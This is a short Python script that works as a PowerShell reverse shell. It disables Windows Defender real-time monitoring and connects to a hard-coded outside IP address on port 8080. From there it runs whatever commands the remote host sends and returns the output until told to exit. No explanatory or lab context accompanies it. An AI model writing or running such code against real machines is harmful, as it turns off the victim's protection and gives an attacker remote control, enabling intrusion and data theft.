from socket import socket, AF_INET, SOCK_STREAM
from subprocess import Popen,PIPE

#command = "Get-Process | Where-Object { $_.CPU -gt 10 }"
def run_powershell_command(command):
    # Run the PowerShell command
    process = Popen(["powershell", command], stdout=PIPE, stderr=PIPE, text=True)
    
    # Get the standard output and standard error
    stdout, stderr = process.communicate()

    # Combine both outputs into a single string
    result = f"Output:\n{stdout}\nError:\n{stderr}"

    return result

def main():
    run_powershell_command("Set-MpPreference -DisableRealtimeMonitoring $true")
    # Server address and port
    host = '175.45.176.100'
    port = 8080
    check = "text"
    # Create a socket object
    client_socket = socket(AF_INET, SOCK_STREAM)
    
    # Connect to the server
    client_socket.connect((host, port))

    while "exit" not in check:
        try:

            # Receive the response from the server
            cmnd = client_socket.recv(1024)

            out = run_powershell_command(cmnd)

            check = str(cmnd)
            
            client_socket.sendall(out.encode('utf-8'))
            
        except Exception as e:
            print("An error occurred:", str(e))
            client_socket.close()
    client_socket.close()

if __name__ == "__main__":
    main()